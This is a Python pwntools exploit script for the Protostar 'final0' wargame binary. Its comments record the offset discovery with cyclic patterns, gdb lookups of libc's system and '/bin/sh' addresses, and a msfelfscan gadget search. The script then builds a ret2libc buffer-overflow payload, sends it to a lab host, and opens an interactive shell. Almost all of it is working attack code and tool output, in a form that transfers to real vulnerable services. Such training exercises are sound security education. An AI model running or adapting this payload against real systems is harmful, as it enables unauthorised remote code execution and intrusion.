#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import numpy as np

context.update(arch='i386')


def createFile(payload):
    tmpFile = '/tmp/payload'
    s = ssh(host='192.168.12.128', user='user', password='user')
    s.upload_data(payload, tmpFile)
    s.close()

io = remote('192.168.12.128', 2995)

'''
io.sendline(cyclic(1000))


ssh into connection and run:
$ dmesg | tail
user@protostar:/opt/protostar/bin$ dmesg | tail
[19128.440385] eth0: link up
[25429.270924] eth0: link down
[25440.281448] eth0: link up
[25472.250771] eth0: link down
[25482.239978] eth0: link up
[27887.004885] eth0: link down
[27898.882028] eth0: link up
[27934.846715] eth0: link down
[27944.837372] eth0: link up
[31909.817189] final0[3434]: segfault at 66616169 ip 66616169 sp bffffc60 error 4

From my local machine:
$ print(cyclic_find(0x66616169))
532
'''
padding = b'a'*532

'''
$ gdb ./final0
b main
r
p system
'''
system = 0xb7ecffb0

'''
user@protostar:/opt/protostar/bin$ ldd final0
    linux-gate.so.1 =>  (0xb7fe4000)
    libc.so.6 => /lib/libc.so.6 (0xb7e99000)
    /lib/ld-linux.so.2 (0xb7fe5000)
user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc.so.6 | grep "/bin/sh"
11f3bf /bin/sh
user@protostar:/opt/protostar/bin$ gdb ./final0
(gdb) b main
Breakpoint 1 at 0x804983c: file final0/final0.c, line 42.
(gdb) r
Starting program: /opt/protostar/bin/final0 

Breakpoint 1, main (argc=1, argv=0xbffff854, envp=0xbffff85c) at final0/final0.c:42
42      final0/final0.c: No such file or directory.
        in final0/final0.c
        (gdb) info proc mappings
        process 4148
        cmdline = '/opt/protostar/bin/final0'
        cwd = '/opt/protostar/bin'
        exe = '/opt/protostar/bin/final0'
        Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
0x8048000  0x804a000     0x2000          0        /opt/protostar/bin/final0
0x804a000  0x804b000     0x1000     0x1000        /opt/protostar/bin/final0
0xb7e96000 0xb7e97000     0x1000          0        
0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
---Type <return> to continue, or q <return> to quit---

(gdb) x/s 0x0011f3bf+0xb7e97000
0xb7fb63bf:      "/bin/sh"
'''
binSh = 0x0011f3bf+0xb7e97000

'''
siuser@ubuntu:~/ctf/protostar/final/final0$ msfelfscan -p final0
...
        [final0]
        0x08048d32 pop ebx; pop ebp; ret
        0x08049134 pop ebx; pop ebp; ret
        0x08049830 pop ebx; pop ebp; ret
        0x08049907 pop edi; pop ebp; ret
        0x08049937 pop ebx; pop ebp; ret

'''
gadget = 0x08048d32
payload = padding
payload += p32(gadget)
payload += p32(0xdeadbeef)
payload += p32(0xdeadbeef)
payload += p32(system)
payload += b'\x90'*4
payload += p32(binSh)
io.sendline(payload)
io.interactive()
